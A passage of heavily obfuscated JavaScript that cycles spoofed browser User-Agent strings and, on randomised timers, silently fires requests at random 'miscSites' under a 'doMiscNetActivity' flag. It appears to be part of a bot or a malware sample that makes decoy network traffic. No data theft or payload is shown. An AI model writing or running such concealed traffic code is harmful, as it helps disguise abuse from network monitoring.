      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x107f + -0x1 * 0x517 + -0x12 * -0x133; k < 0x7 * -0x509 + 0xaaf + -0x23c * -0xb; k++)
    setTimeout(f, (0x1 * -0x19e6e + -0x4ed3 * 0x1 + -0xf28b * -0x3) * k * getRandomInt(-0xb6 * -0x5 + 0x1b4c + -0x1ed9, 0x158c + 0xe8f + -0x2418));
  setInterval(() => {
    f();
    for (let l = -0x1ed * -0x1 + 0x101 * -0x20 + 0x1e33; l < -0x1 * -0x1e52 + -0x3 * 0x489 + 0x9 * -0x1db; l++)
      setTimeout(f, (-0x6a * -0x359 + 0x36cd * 0x1 + 0xaf47 * -0x1) * l * getRandomInt(-0xd * -0x21f + 0x3f6 + -0x1f88, -0x141 * 0x11 + 0x1d94 + 0x30 * -0x2c));
  }, 0x130988 + -0x9691 * 0x29 + 0x3c0231);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x5 * 0x27f + 0x282d + 0x50 * -0x51) * getRandomInt(-0x1 * -0xd2 + 0x5 * 0x545 + -0x1b2a, -0xd87 + 0x1b06 + -0xd7a));
}, 0x9 * -0x107 + -0x1833 + -0x2 * -0x10eb);